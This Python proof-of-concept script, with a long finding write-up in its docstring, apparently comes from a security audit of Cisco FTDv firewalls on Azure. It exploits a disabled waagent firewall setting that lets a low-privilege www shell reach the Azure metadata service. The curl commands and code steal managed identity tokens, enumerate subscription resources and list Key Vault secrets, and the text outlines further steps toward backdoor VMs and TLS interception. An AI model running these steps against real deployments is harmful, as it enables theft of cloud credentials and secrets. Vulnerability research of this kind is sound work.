"""
F-FTD-90: FTDv Azure IMDS accessible from www shell (OS.EnableFirewall=n)
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /usr/local/sf/etc/waagent_ngfwv.conf (Azure Linux Agent config for FTDv):
    Line 124: #OS.EnableFirewall=y  (COMMENTED OUT — would protect IMDS)
    Line 125: OS.EnableFirewall=n   (EXPLICIT DISABLE)

  waagent behavior:
    OS.EnableFirewall=y → waagent adds iptables rules to protect Azure host
                          node services, specifically:
                            -A OUTPUT -d 168.63.129.16 -m owner ! --uid-owner root -j DROP
                            -A OUTPUT -d 169.254.169.254 -m owner ! --uid-owner root -j DROP
    OS.EnableFirewall=n → waagent does NOT add these rules
                        → 169.254.169.254 (IMDS) reachable from ANY process,
                          including www-owned child processes

  Azure Instance Metadata Service (IMDS):
    Endpoint: http://169.254.169.254/metadata/instance?api-version=2021-01-01
    No auth required — link-local, accessible to any process on the VM
    Provides: VM identity, subscription ID, resource group, managed identity tokens

IMPACT:
  From www shell on FTDv deployed in Azure:

  1. Read VM metadata (no auth):
     curl -s -H 'Metadata: true' \
       'http://169.254.169.254/metadata/instance?api-version=2021-01-01'
     → Returns: subscription ID, resource group, VM name, region, tags
     → Leaks full Azure resource identity (useful for scope enumeration)

  2. If FTDv has Azure Managed Identity assigned:
     curl -s -H 'Metadata: true' \
       'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
     → Returns: access_token (JWT) valid for Azure ARM API
     → SCOPE: whatever Azure RBAC roles the managed identity holds

  3. With Azure ARM token:
     - List all resources in subscription (if Reader or Contributor)
     - Access Azure Key Vault secrets (if Key Vault access policy grants MI)
     - Read Azure Storage (if Storage Blob Data Reader/Contributor)
     - If Contributor: modify network security groups, create backdoor VMs
     - If Owner: full subscription access

  CISCO CONTEXT:
  FTDv in Azure is commonly deployed with:
    - Managed Identity for accessing Key Vault (storing FTD license keys,
      SSL inspection CA certs, or customer PKI material)
    - Reader role to enumerate network topology
    - Contributor for auto-scaling groups

  CRITICAL ESCALATION PATH:
  FTDv (Azure Managed Identity) → Key Vault → SSL inspection CA private key
    → FTDv SSL inspection CA (same as F-FTD-48/F-FTD-86 chain)
    → MITM all TLS traffic through the FTD

ATTACK:
  Prerequisite: www shell on FTDv deployed in Azure

  Step 1: Confirm IMDS reachability:
    curl -s -H 'Metadata: true' \
      'http://169.254.169.254/metadata/instance?api-version=2021-01-01'

  Step 2: Request managed identity token:
    curl -s -H 'Metadata: true' \
      'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
    # If managed identity assigned: token returned

  Step 3: Enumerate Azure resources with token:
    TOKEN=$(curl -s -H 'Metadata: true' \
      'http://169.254.169.254/metadata/identity/oauth2/token?...' | python3 -c \
      "import sys,json; print(json.load(sys.stdin)['access_token'])")

    curl -H "Authorization: Bearer $TOKEN" \
      "https://management.azure.com/subscriptions/{subId}/resources?api-version=2021-04-01"

  Step 4: Access Key Vault (if assigned):
    curl -s -H 'Metadata: true' \
      'http://169.254.169.254/metadata/identity/oauth2/token?...&resource=https://vault.azure.net/'
    → Key Vault token → GET https://<vault>.vault.azure.net/secrets?api-version=7.3

ALSO PRESENT — Azure Wire Server (168.63.129.16):
  Azure Wire Server also accessible when OS.EnableFirewall=n
  Provides: VM extensions API, certificates, fabric controller communication
  GET http://168.63.129.16/?comp=versions → VM extension config
  This may expose additional deployment secrets or extension credentials

VERIFY (controlled environment — FTDv in Azure only):
  curl -sv -H 'Metadata: true' \
    'http://169.254.169.254/metadata/instance?api-version=2021-01-01' 2>&1 | head -20
  # 200 + JSON → IMDS accessible (OS.EnableFirewall=n confirmed effective)
  # Connection refused / timeout → not Azure or firewall rules present

Affected: FTD 6.7.0-65 FTDv on Azure (waagent_ngfwv.conf OS.EnableFirewall=n confirmed)
Severity: HIGH (CRITICAL if managed identity with Key Vault access assigned) —
          www shell → IMDS → managed identity token → full Azure ARM access within
          scope of MI role assignments; Key Vault access exposes all stored secrets
Auth required: www shell (post F-FTD-67, F-FTD-78, or equivalent)
Platform: Azure (FTDv only — waagent not present on physical appliances)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess
import json


IMDS_BASE = "http://169.254.169.254/metadata"
IMDS_API_VERSION = "2021-01-01"
MI_TOKEN_API_VERSION = "2018-02-01"
WIRE_SERVER = "http://168.63.129.16"


def get_instance_metadata():
    """
    Retrieve Azure VM instance metadata from IMDS.
    CONTROLLED ENVIRONMENT ONLY.
    """
    url = f"{IMDS_BASE}/instance?api-version={IMDS_API_VERSION}"
    print(f"[*] F-FTD-90: Querying Azure IMDS: {url}")

    cmd = ["curl", "-s", "-H", "Metadata: true", "--connect-timeout", "5", url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if not result.stdout:
            print(f"[-] No response — not Azure or IMDS blocked")
            return None

        data = json.loads(result.stdout)
        compute = data.get('compute', {})
        print(f"[!!!] Azure IMDS accessible (OS.EnableFirewall=n confirmed)")
        print(f"    VM Name:         {compute.get('name')}")
        print(f"    Resource Group:  {compute.get('resourceGroupName')}")
        print(f"    Subscription ID: {compute.get('subscriptionId')}")
        print(f"    Location:        {compute.get('location')}")
        print(f"    VM Size:         {compute.get('vmSize')}")
        print(f"    OS:              {compute.get('osType')} {compute.get('osVersion')}")
        tags = compute.get('tags', '')
        if tags:
            print(f"    Tags:            {tags}")
        return data

    except json.JSONDecodeError:
        print(f"    Raw response: {result.stdout[:300]}")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def get_managed_identity_token(resource="https://management.azure.com/"):
    """
    Request Azure managed identity token from IMDS.
    Returns access token if managed identity is assigned.
    CONTROLLED ENVIRONMENT ONLY.
    """
    url = (f"{IMDS_BASE}/identity/oauth2/token?"
           f"api-version={MI_TOKEN_API_VERSION}&resource={resource}")
    print(f"[*] F-FTD-90: Requesting managed identity token for: {resource}")

    cmd = ["curl", "-s", "-H", "Metadata: true", "--connect-timeout", "5", url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if not result.stdout:
            print(f"[-] No response")
            return None

        data = json.loads(result.stdout)
        if 'access_token' in data:
            token = data['access_token']
            print(f"[!!!] Managed Identity token obtained!")
            print(f"    Token type: {data.get('token_type')}")
            print(f"    Expires in: {data.get('expires_in')}s")
            print(f"    Resource:   {resource}")
            print(f"    Token (first 50 chars): {token[:50]}...")
            return token
        elif 'error' in data:
            err = data.get('error')
            desc = data.get('error_description', '')
            if 'MSI' in str(err) or 'identity' in str(err).lower():
                print(f"[-] No managed identity assigned to this VM: {err}")
            else:
                print(f"[-] Token error: {err} — {desc[:100]}")
        else:
            print(f"    Response: {result.stdout[:200]}")
        return None

    except json.JSONDecodeError:
        print(f"    Raw response: {result.stdout[:200]}")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def enumerate_azure_resources(token, sub_id=None):
    """
    Enumerate Azure resources using managed identity token.
    CONTROLLED ENVIRONMENT ONLY.
    """
    if not sub_id:
        # Get sub ID from instance metadata
        metadata = get_instance_metadata()
        if metadata:
            sub_id = metadata.get('compute', {}).get('subscriptionId')

    if not sub_id:
        print(f"[-] Cannot enumerate without subscription ID")
        return

    url = f"https://management.azure.com/subscriptions/{sub_id}/resources?api-version=2021-04-01"
    print(f"[*] F-FTD-90: Enumerating Azure resources in subscription {sub_id}")

    cmd = ["curl", "-s", "-H", f"Authorization: Bearer {token}", url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        data = json.loads(result.stdout)
        resources = data.get('value', [])
        print(f"[!!!] {len(resources)} resources found in subscription:")
        for r in resources[:20]:
            print(f"    {r.get('type')}: {r.get('name')} ({r.get('location')})")
        if len(resources) > 20:
            print(f"    ... and {len(resources) - 20} more")
        return resources

    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def print_attack_summary():
    print("""
F-FTD-90: Azure IMDS Access from www Shell (OS.EnableFirewall=n)
================================================================

Source: /usr/local/sf/etc/waagent_ngfwv.conf
Config: OS.EnableFirewall=n (waagent does NOT add IMDS firewall rules)
Result: 169.254.169.254 and 168.63.129.16 reachable from www process

IMDS ATTACK CHAIN:
  www shell → GET http://169.254.169.254/metadata/instance
    → subscription ID, resource group, VM name, tags

  If Managed Identity assigned:
  www shell → GET /metadata/identity/oauth2/token → ARM token
    → Azure ARM: enumerate all resources, VNets, NSGs
    → Key Vault (if access policy): read all secrets and certificates
    → Storage: read/write all blobs and files
    → If Contributor role: create backdoor VMs, modify NSG rules

EXPLOITATION NOTES:
  - Most FTDv Azure deployments have Managed Identity for Key Vault access
    (license management, SSL CA certs, customer PKI material)
  - Cisco documentation recommends assigning managed identity to FTDv
    for automated license activation (Smart Licensing)
  - If Key Vault holds SSL inspection CA → attacker reads CA private key
    → MITM all TLS traffic through the FTD (same impact as F-FTD-48)

Wire Server (168.63.129.16):
  GET http://168.63.129.16/?comp=versions → fabric controller
  May expose VM extension configuration and deployment credentials
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-90: Azure IMDS access from www shell (OS.EnableFirewall=n)")
    print("CONTROLLED ENVIRONMENT ONLY — FTDv Azure deployments only")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_attack_summary()

    elif mode == "metadata":
        get_instance_metadata()

    elif mode == "token":
        resource = sys.argv[2] if len(sys.argv) > 2 else "https://management.azure.com/"
        get_managed_identity_token(resource)

    elif mode == "enum":
        token = get_managed_identity_token()
        if token:
            enumerate_azure_resources(token)

    elif mode == "keyvault":
        vault_name = sys.argv[2] if len(sys.argv) > 2 else None
        token = get_managed_identity_token("https://vault.azure.net/")
        if token and vault_name:
            url = f"https://{vault_name}.vault.azure.net/secrets?api-version=7.3"
            result = subprocess.run(
                ["curl", "-s", "-H", f"Authorization: Bearer {token}", url],
                capture_output=True, text=True, timeout=15
            )
            print(f"Key Vault secrets: {result.stdout[:500]}")

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
